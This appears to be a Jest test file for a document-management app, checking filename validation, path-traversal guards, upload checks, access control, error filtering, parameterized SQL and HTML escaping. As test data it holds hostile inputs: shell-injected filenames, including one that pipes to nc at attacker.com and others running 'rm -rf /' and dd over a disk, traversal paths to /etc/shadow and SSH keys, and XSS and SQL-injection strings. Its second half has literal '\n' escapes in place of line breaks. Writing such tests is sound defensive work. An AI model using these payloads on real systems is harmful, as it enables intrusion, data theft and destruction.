/**
 * Semgrep Security Tests for Document Management
 * 
 * Tests document management security based on Semgrep security rules:
 * - Command injection prevention
 * - Directory traversal protection  
 * - File upload security
 * - Input validation
 * - Authorization bypass prevention
 * - Cryptographic security
 * - Information disclosure prevention
 * - SQL injection prevention
 * - XSS prevention
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as path from 'path';
import * as crypto from 'crypto';

describe('Document Management - Semgrep Security Rules', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Command Injection Prevention (semgrep: command-injection-risk)', () => {
    it('should prevent command injection in filename processing', () => {
      const validateFilename = (filename: string): boolean => {
        // Prevent command injection patterns
        const dangerousPatterns = [
          /[;&|`$()\\[\\]{}\\\\]/,  // Shell metacharacters
          /\.\./,                   // Path traversal
          /[<>]/,                   // Redirection
          /\s*(rm|del|format|dd)\s/i, // Dangerous commands
        ];
        
        return !dangerousPatterns.some(pattern => pattern.test(filename));
      };

      const maliciousFilenames = [
        'document.pdf; rm -rf /',
        'contract.pdf && cat /etc/passwd',
        'invoice.pdf | nc attacker.com 1234',
        'file.pdf$(whoami)',
        'doc.pdf`id`',
        'report.pdf; format c:',
        'data.pdf && dd if=/dev/zero of=/dev/sda'
      ];

      maliciousFilenames.forEach(filename => {
        expect(validateFilename(filename)).toBe(false);
      });

      // Safe filenames should pass
      const safeFilenames = ['document.pdf', 'contract_2024.docx', 'invoice-123.txt'];
      safeFilenames.forEach(filename => {
        expect(validateFilename(filename)).toBe(true);
      });
    });

    it('should sanitize shell commands when processing files', () => {
      const sanitizeShellCommand = (command: string): string => {
        // Remove dangerous shell metacharacters
        return command.replace(/[;&|`$()\\[\\]{}\\\\<>]/g, '')
                      .replace(/\s+/g, ' ')
                      .trim();
      };

      const dangerousCommand = 'convert document.pdf; rm -rf / output.jpg';
      const sanitized = sanitizeShellCommand(dangerousCommand);
      
      expect(sanitized).toBe('convert document.pdf rm -rf  output.jpg');
      expect(sanitized).not.toContain(';');
      expect(sanitized).not.toContain('|');
    });
  });

  describe('Directory Traversal Prevention (semgrep: directory-traversal-prevention)', () => {
    it('should detect and prevent path traversal attacks', () => {
      const isPathTraversalSafe = (userPath: string, baseDir: string = '/uploads'): boolean => {
        try {
          const normalizedPath = path.normalize(userPath);
          const resolvedPath = path.resolve(baseDir, normalizedPath);
          const baseDirResolved = path.resolve(baseDir);
          
          return resolvedPath.startsWith(baseDirResolved);
        } catch {
          return false;
        }
      };

      const pathTraversalAttempts = [
        '../../../etc/passwd',
        '..\\\\..\\\\..\\\\windows\\\\system32\\\\config',
        '/etc/shadow',
        '../../../../root/.ssh/id_rsa',
        '..%2F..%2F..%2Fetc%2Fpasswd', // URL encoded
        '....//....//....//etc/passwd', // Double encoding
        '..\\\\..\\\\..\\\\boot.ini',
        '/home/../../../etc/passwd'
      ];

      pathTraversalAttempts.forEach(maliciousPath => {
        expect(isPathTraversalSafe(maliciousPath)).toBe(false);
      });

      // Safe paths should be allowed
      const safePaths = ['document.pdf', 'legal/contract.pdf', 'uploads/2024/file.txt'];
      safePaths.forEach(safePath => {
        expect(isPathTraversalSafe(safePath)).toBe(true);
      });
    });

    it('should validate file paths before operations', () => {
      const validateFilePath = (filePath: string): { valid: boolean; error?: string } => {
        // Check for path traversal
        if (filePath.includes('..')) {
          return { valid: false, error: 'Path traversal detected' };
        }
        
        // Check for absolute paths outside allowed directory
        if (path.isAbsolute(filePath) && !filePath.startsWith('/uploads')) {
          return { valid: false, error: 'Access outside uploads directory' };
        }
        
        // Check for dangerous system paths
        const dangerousPaths = ['/etc/', '/root/', '/home/', '/usr/', '/var/', '/sys/'];
        if (dangerousPaths.some(dangerous => filePath.toLowerCase().includes(dangerous))) {
          return { valid: false, error: 'Access to system directory' };
        }
        
        return { valid: true };
      };

      expect(validateFilePath('../../../etc/passwd')).toEqual({
        valid: false,
        error: 'Path traversal detected'
      });
      
      expect(validateFilePath('/etc/shadow')).toEqual({
        valid: false,
        error: 'Access to system directory'
      });
      
      expect(validateFilePath('documents/contract.pdf')).toEqual({
        valid: true
      });
    });
  });

  describe('File Upload Security (semgrep: file-upload-security)', () => {
    it('should validate file content against declared MIME type', () => {
      const validateFileContent = (declaredMimeType: string, fileContent: Buffer): boolean => {
        const magicNumbers: { [key: string]: number[] } = {
          'application/pdf': [0x25, 0x50, 0x44, 0x46], // %PDF
          'image/jpeg': [0xFF, 0xD8, 0xFF],              // JPEG
          'image/png': [0x89, 0x50, 0x4E, 0x47],         // PNG signature
          'image/gif': [0x47, 0x49, 0x46, 0x38],         // GIF8
          'application/zip': [0x50, 0x4B, 0x03, 0x04],   // ZIP
          'text/plain': [] // Text files don't have reliable magic numbers
        };

        const expected = magicNumbers[declaredMimeType];
        if (!expected || expected.length === 0) {
          return declaredMimeType === 'text/plain'; // Allow text files
        }

        // Check if file starts with expected magic number
        for (let i = 0; i < expected.length; i++) {
          if (fileContent[i] !== expected[i]) return false;
        }
        
        return true;
      };

      // Test valid file content
      const pdfContent = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2D, 0x31, 0x2E, 0x34]);
      expect(validateFileContent('application/pdf', pdfContent)).toBe(true);

      // Test content mismatch (JPEG content claimed as PDF)
      const jpegContent = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10]);
      expect(validateFileContent('application/pdf', jpegContent)).toBe(false);
      expect(validateFileContent('image/jpeg', jpegContent)).toBe(true);
    });

    it('should prevent dangerous file type uploads', () => {
      const isDangerousFileType = (filename: string, mimeType: string): boolean => {
        const dangerousExtensions = [
          '.exe', '.bat', '.cmd', '.com', '.scr', '.pif', '.app',
          '.js', '.vbs', '.jar', '.war', '.ear', '.deb', '.dmg',
          '.sh', '.py', '.rb', '.pl', '.php', '.asp', '.aspx'
        ];

        const dangerousMimeTypes = [
          'application/x-msdownload',
          'application/x-executable',
          'application/java-archive',
          'text/javascript',
          'application/javascript',
          'text/x-python',
          'text/x-shellscript'
        ];

        const extension = path.extname(filename).toLowerCase();
        return dangerousExtensions.includes(extension) || 
               dangerousMimeTypes.includes(mimeType.toLowerCase());
      };

      // Should reject dangerous files
      expect(isDangerousFileType('malware.exe', 'application/x-msdownload')).toBe(true);
      expect(isDangerousFileType('script.js', 'text/javascript')).toBe(true);
      expect(isDangerousFileType('backdoor.sh', 'text/x-shellscript')).toBe(true);

      // Should allow safe files
      expect(isDangerousFileType('document.pdf', 'application/pdf')).toBe(false);
      expect(isDangerousFileType('image.jpg', 'image/jpeg')).toBe(false);
      expect(isDangerousFileType('text.txt', 'text/plain')).toBe(false);
    });

    it('should enforce role-based file size limits', () => {
      const getRoleBasedSizeLimit = (userRole: string): number => {
        const limits: { [key: string]: number } = {
          'admin': 100 * 1024 * 1024,    // 100MB
          'manager': 50 * 1024 * 1024,   // 50MB
          'resident': 25 * 1024 * 1024,  // 25MB
          'tenant': 10 * 1024 * 1024     // 10MB
        };
        return limits[userRole] || 5 * 1024 * 1024; // Default 5MB
      };

      const validateFileSize = (fileSize: number, userRole: string): boolean => {
        return fileSize <= getRoleBasedSizeLimit(userRole);
      };

      const largeFile = 30 * 1024 * 1024; // 30MB
      
      expect(validateFileSize(largeFile, 'admin')).toBe(true);
      expect(validateFileSize(largeFile, 'manager')).toBe(true);
      expect(validateFileSize(largeFile, 'resident')).toBe(false);
      expect(validateFileSize(largeFile, 'tenant')).toBe(false);
    });
  });

  describe('Input Validation (semgrep: input-validation)', () => {\n    it('should sanitize document metadata inputs', () => {\n      const sanitizeDocumentInput = (input: string): string => {\n        return input\n          // Remove script tags\n          .replace(/<script[^>]*>.*?<\\/script>/gi, '')\n          // Remove all HTML tags\n          .replace(/<[^>]+>/g, '')\n          // Remove javascript: protocol\n          .replace(/javascript:/gi, '')\n          // Remove event handlers\n          .replace(/on\\w+\\s*=/gi, '')\n          // Remove data: URLs\n          .replace(/data:[^;]*;base64,/gi, '')\n          // Trim whitespace\n          .trim();\n      };\n\n      const maliciousInputs = [\n        '<script>alert(\"XSS\")</script>Document Title',\n        'Title<img src=x onerror=alert(1)>',\n        'javascript:alert(\"XSS\")Document',\n        '<iframe src=\"javascript:alert(1)\"></iframe>Title',\n        'Document<svg onload=alert(1)>',\n        'Title<body onload=alert(1)>'\n      ];\n\n      maliciousInputs.forEach(input => {\n        const sanitized = sanitizeDocumentInput(input);\n        expect(sanitized).not.toContain('<script>');\n        expect(sanitized).not.toContain('javascript:');\n        expect(sanitized).not.toContain('onerror=');\n        expect(sanitized).not.toContain('onload=');\n        expect(sanitized).not.toContain('<iframe>');\n      });\n    });\n\n    it('should validate document categories against whitelist', () => {\n      const allowedCategories = [\n        'legal', 'financial', 'maintenance', 'general',\n        'building_rules', 'meeting_minutes', 'insurance',\n        'contracts', 'correspondence', 'technical'\n      ];\n\n      const validateCategory = (category: string): boolean => {\n        const normalized = category.toLowerCase().trim();\n        return allowedCategories.includes(normalized);\n      };\n\n      expect(validateCategory('legal')).toBe(true);\n      expect(validateCategory('FINANCIAL')).toBe(true);\n      expect(validateCategory('  maintenance  ')).toBe(true);\n      \n      // Should reject invalid categories\n      expect(validateCategory('../../etc/passwd')).toBe(false);\n      expect(validateCategory('<script>alert(1)</script>')).toBe(false);\n      expect(validateCategory('DROP TABLE documents')).toBe(false);\n    });\n  });\n\n  describe('Authorization Bypass Prevention (semgrep: authorization-bypass)', () => {\n    it('should prevent privilege escalation in document access', () => {\n      interface User {\n        id: string;\n        role: string;\n        organizationId?: string;\n      }\n\n      interface DocumentAccess {\n        documentId: string;\n        ownerId: string;\n        organizationId?: string;\n        visibility: 'private' | 'organization' | 'public' | 'tenant_visible';\n      }\n\n      const checkDocumentAccess = (user: User, document: DocumentAccess): boolean => {\n        // Admin has access to everything\n        if (user.role === 'admin') return true;\n        \n        // Owner has access to their own documents\n        if (document.ownerId === user.id) return true;\n        \n        // Public documents accessible to all\n        if (document.visibility === 'public') return true;\n        \n        // Organization-level access for managers and residents\n        if (document.visibility === 'organization' && \n            user.organizationId === document.organizationId &&\n            ['manager', 'resident'].includes(user.role)) {\n          return true;\n        }\n        \n        // Tenant-visible documents for tenants in same organization\n        if (document.visibility === 'tenant_visible' &&\n            user.organizationId === document.organizationId &&\n            user.role === 'tenant') {\n          return true;\n        }\n        \n        return false;\n      };\n\n      const admin = { id: 'admin1', role: 'admin' };\n      const manager = { id: 'mgr1', role: 'manager', organizationId: 'org1' };\n      const resident = { id: 'res1', role: 'resident', organizationId: 'org1' };\n      const tenant = { id: 'ten1', role: 'tenant', organizationId: 'org1' };\n      const outsider = { id: 'out1', role: 'tenant', organizationId: 'org2' };\n      \n      const privateDoc = {\n        documentId: 'doc1',\n        ownerId: 'res1',\n        organizationId: 'org1',\n        visibility: 'private' as const\n      };\n      \n      const tenantDoc = {\n        documentId: 'doc2',\n        ownerId: 'mgr1',\n        organizationId: 'org1',\n        visibility: 'tenant_visible' as const\n      };\n\n      // Test legitimate access\n      expect(checkDocumentAccess(admin, privateDoc)).toBe(true);\n      expect(checkDocumentAccess(resident, privateDoc)).toBe(true); // Owner\n      expect(checkDocumentAccess(tenant, tenantDoc)).toBe(true);\n      \n      // Test blocked access\n      expect(checkDocumentAccess(tenant, privateDoc)).toBe(false);\n      expect(checkDocumentAccess(outsider, tenantDoc)).toBe(false);\n    });\n\n    it('should validate JWT tokens properly', () => {\n      const validateJWT = (token: string, requiredRole?: string): { valid: boolean; payload?: any } => {\n        try {\n          const parts = token.split('.');\n          if (parts.length !== 3) return { valid: false };\n          \n          const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());\n          \n          // Check expiration\n          if (payload.exp && payload.exp < Date.now() / 1000) {\n            return { valid: false };\n          }\n          \n          // Check required role\n          if (requiredRole) {\n            const roleHierarchy: { [key: string]: number } = {\n              'admin': 4, 'manager': 3, 'resident': 2, 'tenant': 1\n            };\n            \n            const userLevel = roleHierarchy[payload.role] || 0;\n            const requiredLevel = roleHierarchy[requiredRole] || 0;\n            \n            if (userLevel < requiredLevel) {\n              return { valid: false };\n            }\n          }\n          \n          return { valid: true, payload };\n        } catch {\n          return { valid: false };\n        }\n      };\n\n      // Valid token\n      const validPayload = {\n        userId: 'user123',\n        role: 'manager',\n        exp: Math.floor(Date.now() / 1000) + 3600 // 1 hour from now\n      };\n      const validToken = 'header.' + Buffer.from(JSON.stringify(validPayload)).toString('base64') + '.signature';\n      \n      // Expired token\n      const expiredPayload = {\n        userId: 'user123',\n        role: 'manager',\n        exp: Math.floor(Date.now() / 1000) - 3600 // 1 hour ago\n      };\n      const expiredToken = 'header.' + Buffer.from(JSON.stringify(expiredPayload)).toString('base64') + '.signature';\n\n      expect(validateJWT(validToken, 'tenant')).toEqual({ valid: true, payload: validPayload });\n      expect(validateJWT(validToken, 'admin')).toEqual({ valid: false });\n      expect(validateJWT(expiredToken)).toEqual({ valid: false });\n      expect(validateJWT('invalid.token')).toEqual({ valid: false });\n    });\n  });\n\n  describe('Cryptographic Security (semgrep: weak-crypto-usage)', () => {\n    it('should use strong hashing algorithms for file integrity', () => {\n      const generateFileHash = (data: Buffer, algorithm: string = 'sha256'): string => {\n        const hash = crypto.createHash(algorithm);\n        hash.update(data);\n        return hash.digest('hex');\n      };\n\n      const testData = Buffer.from('document content for integrity check');\n      \n      // Test strong algorithms\n      const sha256Hash = generateFileHash(testData, 'sha256');\n      const sha512Hash = generateFileHash(testData, 'sha512');\n      \n      expect(sha256Hash).toHaveLength(64);\n      expect(sha512Hash).toHaveLength(128);\n      expect(sha256Hash).toMatch(/^[a-f0-9]+$/);\n      \n      // Ensure we're not using weak algorithms\n      expect(() => generateFileHash(testData, 'md5')).not.toThrow();\n      expect(() => generateFileHash(testData, 'sha1')).not.toThrow();\n      \n      // But we should prefer strong ones in production\n      const preferredHash = generateFileHash(testData); // Defaults to SHA-256\n      expect(preferredHash).toBe(sha256Hash);\n    });\n\n    it('should generate cryptographically secure random filenames', () => {\n      const generateSecureFilename = (originalName: string): string => {\n        const extension = path.extname(originalName);\n        const randomBytes = crypto.randomBytes(16);\n        const timestamp = Date.now().toString(36);\n        return `${randomBytes.toString('hex')}_${timestamp}${extension}`;\n      };\n\n      const filename1 = generateSecureFilename('document.pdf');\n      const filename2 = generateSecureFilename('document.pdf');\n      \n      expect(filename1).toMatch(/^[a-f0-9]{32}_[a-z0-9]+\\.pdf$/);\n      expect(filename2).toMatch(/^[a-f0-9]{32}_[a-z0-9]+\\.pdf$/);\n      expect(filename1).not.toBe(filename2); // Should be unique\n    });\n  });\n\n  describe('Information Disclosure Prevention (semgrep: info-disclosure)', () => {\n    it('should sanitize error messages based on user role', () => {\n      const createSafeErrorMessage = (error: Error, userRole: string): string => {\n        // Full error details for admins\n        if (userRole === 'admin') {\n          return error.message;\n        }\n        \n        // Generic messages for other users to prevent information disclosure\n        const errorMap: { [key: string]: string } = {\n          'ENOENT': 'Document not found',\n          'EACCES': 'Access denied',\n          'EMFILE': 'Too many files uploaded',\n          'ENOSPC': 'Storage limit exceeded',\n          'EISDIR': 'Invalid file path',\n          'ENAMETOOLONG': 'Filename too long'\n        };\n        \n        const errorCode = (error as any).code;\n        return errorMap[errorCode] || 'An error occurred while processing your request';\n      };\n\n      const sensitiveError = new Error('ENOENT: no such file or directory, open \\'/home/secrets/confidential.pdf\\'') as any;\n      sensitiveError.code = 'ENOENT';\n      \n      const adminMessage = createSafeErrorMessage(sensitiveError, 'admin');\n      const userMessage = createSafeErrorMessage(sensitiveError, 'tenant');\n      \n      expect(adminMessage).toContain('/home/secrets/confidential.pdf');\n      expect(userMessage).toBe('Document not found');\n      expect(userMessage).not.toContain('/home/secrets');\n    });\n\n    it('should filter sensitive data from audit logs based on viewer role', () => {\n      interface AuditLogEntry {\n        id: string;\n        timestamp: string;\n        event: string;\n        userId: string;\n        ipAddress?: string;\n        userAgent?: string;\n        details?: {\n          fileName?: string;\n          filePath?: string;\n          systemPath?: string;\n          errorDetails?: string;\n        };\n      }\n\n      const filterAuditLogForRole = (entry: AuditLogEntry, viewerRole: string): AuditLogEntry => {\n        const filtered = { ...entry };\n        \n        if (viewerRole !== 'admin') {\n          // Remove sensitive technical details for non-admin users\n          delete filtered.ipAddress;\n          delete filtered.userAgent;\n          \n          if (filtered.details) {\n            delete filtered.details.filePath;\n            delete filtered.details.systemPath;\n            delete filtered.details.errorDetails;\n          }\n        }\n        \n        return filtered;\n      };\n\n      const sensitiveEntry: AuditLogEntry = {\n        id: 'audit-123',\n        timestamp: '2024-01-15T10:30:00Z',\n        event: 'DOCUMENT_UPLOAD_FAILED',\n        userId: 'user-456',\n        ipAddress: '192.168.1.100',\n        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n        details: {\n          fileName: 'contract.pdf',\n          filePath: '/uploads/legal/contract.pdf',\n          systemPath: '/home/app/data/uploads/legal/contract.pdf',\n          errorDetails: 'File validation failed: potential malware detected'\n        }\n      };\n\n      const adminView = filterAuditLogForRole(sensitiveEntry, 'admin');\n      const managerView = filterAuditLogForRole(sensitiveEntry, 'manager');\n      \n      // Admin sees everything\n      expect(adminView.ipAddress).toBeDefined();\n      expect(adminView.details?.systemPath).toBeDefined();\n      \n      // Manager sees filtered version\n      expect(managerView.ipAddress).toBeUndefined();\n      expect(managerView.details?.systemPath).toBeUndefined();\n      expect(managerView.details?.fileName).toBeDefined(); // Non-sensitive info preserved\n    });\n  });\n\n  describe('SQL Injection Prevention (semgrep: sql-injection)', () => {\n    it('should use parameterized queries for document operations', () => {\n      // Mock database query function that simulates parameterized queries\n      const executeQuery = (query: string, params: any[]): { query: string; params: any[] } => {\n        return { query, params };\n      };\n\n      const searchDocuments = (searchTerm: string, userId: string, category?: string): any => {\n        let query = 'SELECT * FROM documents WHERE name LIKE ? AND user_id = ?';\n        let params = [`%${searchTerm}%`, userId];\n        \n        if (category) {\n          query += ' AND category = ?';\n          params.push(category);\n        }\n        \n        return executeQuery(query, params);\n      };\n\n      // Test with potentially malicious input\n      const maliciousSearch = \"'; DROP TABLE documents; --\";\n      const result = searchDocuments(maliciousSearch, 'user123', 'legal');\n      \n      expect(result.query).toContain('?'); // Uses parameterized placeholders\n      expect(result.params).toContain(\"%'; DROP TABLE documents; --%\");\n      expect(result.query).not.toContain('DROP TABLE'); // Malicious SQL not in query\n    });\n\n    it('should escape special characters in search queries', () => {\n      const escapeSearchTerm = (term: string): string => {\n        return term.replace(/[%_\\\\]/g, '\\\\$&'); // Escape SQL LIKE wildcards\n      };\n\n      const searchTerm = \"file_name%with_wildcards\";\n      const escaped = escapeSearchTerm(searchTerm);\n      \n      expect(escaped).toBe(\"file\\\\_name\\\\%with\\\\_wildcards\");\n    });\n  });\n\n  describe('Cross-Site Scripting Prevention (semgrep: xss-prevention)', () => {\n    it('should escape HTML in document names and descriptions', () => {\n      const escapeHtml = (unsafe: string): string => {\n        return unsafe\n          .replace(/&/g, '&amp;')\n          .replace(/</g, '&lt;')\n          .replace(/>/g, '&gt;')\n          .replace(/\"/g, '&quot;')\n          .replace(/'/g, '&#x27;')\n          .replace(/\\//g, '&#x2F;');\n      };\n\n      const maliciousInputs = [\n        '<script>alert(\"XSS\")</script>',\n        '<img src=x onerror=alert(1)>',\n        '\"onmouseover=\"alert(1)\"',\n        \"'onload='alert(1)'\",\n        '</title><script>alert(1)</script>'\n      ];\n\n      maliciousInputs.forEach(input => {\n        const escaped = escapeHtml(input);\n        expect(escaped).not.toContain('<script>');\n        expect(escaped).not.toContain('onerror=');\n        expect(escaped).not.toContain('onload=');\n        expect(escaped).not.toContain('onmouseover=');\n      });\n\n      // Test specific cases\n      expect(escapeHtml('<script>alert(\"XSS\")</script>'))\n        .toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');\n    });\n\n    it('should validate and sanitize document metadata for display', () => {\n      interface DocumentMetadata {\n        name: string;\n        description: string;\n        category: string;\n        tags: string[];\n      }\n\n      const sanitizeMetadata = (metadata: DocumentMetadata): DocumentMetadata => {\n        const escapeHtml = (str: string): string => {\n          return str.replace(/[&<>\"'\\\/]/g, (char) => {\n            const entities: { [key: string]: string } = {\n              '&': '&amp;',\n              '<': '&lt;',\n              '>': '&gt;',\n              '\"': '&quot;',\n              \"'\": '&#x27;',\n              '/': '&#x2F;'\n            };\n            return entities[char];\n          });\n        };\n\n        return {\n          name: escapeHtml(metadata.name.substring(0, 255)), // Limit length\n          description: escapeHtml(metadata.description.substring(0, 1000)),\n          category: escapeHtml(metadata.category),\n          tags: metadata.tags.map(tag => escapeHtml(tag.substring(0, 50)))\n        };\n      };\n\n      const maliciousMetadata: DocumentMetadata = {\n        name: '<script>alert(\"XSS\")</script>Contract',\n        description: 'Description<img src=x onerror=alert(1)>',\n        category: 'legal<script>',\n        tags: ['important', '<script>alert(1)</script>', 'confidential']\n      };\n\n      const sanitized = sanitizeMetadata(maliciousMetadata);\n      \n      expect(sanitized.name).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;Contract');\n      expect(sanitized.description).not.toContain('<img');\n      expect(sanitized.category).not.toContain('<script>');\n      expect(sanitized.tags[1]).not.toContain('<script>');\n    });\n  });\n});